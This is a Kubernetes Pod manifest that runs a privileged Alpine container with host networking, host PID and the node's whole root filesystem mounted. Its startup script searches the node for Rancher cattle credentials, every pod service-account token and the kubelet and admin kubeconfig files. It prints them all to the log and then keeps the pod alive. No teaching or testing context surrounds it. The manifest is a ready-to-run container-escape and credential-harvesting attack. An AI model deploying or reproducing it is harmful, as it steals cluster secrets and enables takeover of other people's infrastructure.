apiVersion: v1
kind: Pod
metadata:
  name: network-access
  namespace: egam-production
spec:
  hostNetwork: true
  hostPID: true
  containers:
  - name: shell
    image: alpine:3.19
    command:
      - /bin/sh
      - -c
      - |
        apk add --no-cache curl jq > /dev/null 2>&1

        echo "=== RANCHER CREDENTIALS (fresh) ==="
        find /host/var/lib/kubelet/pods -path "*cattle-credentials*" -type f 2>/dev/null | while read f; do
          echo "--- $f ---"
          cat "$f" 2>/dev/null
          echo ""
        done

        echo "=== ALL TOKENS ON NODE ==="
        find /host/var/lib/kubelet/pods -name "token" -type f 2>/dev/null | while read f; do
          echo "--- $f ---"
          cat "$f" 2>/dev/null | head -1
          echo ""
        done

        echo "=== KUBELET KUBECONFIG ==="
        cat /host/etc/kubernetes/kubelet.conf 2>/dev/null || true
        cat /host/var/lib/kubelet/kubeconfig 2>/dev/null || true
        cat /host/etc/kubernetes/admin.conf 2>/dev/null || true

        echo "=== DONE ==="
        sleep 36000
    securityContext:
      privileged: true
    volumeMounts:
    - mountPath: /host
      name: host
  volumes:
  - name: host
    hostPath:
      path: /
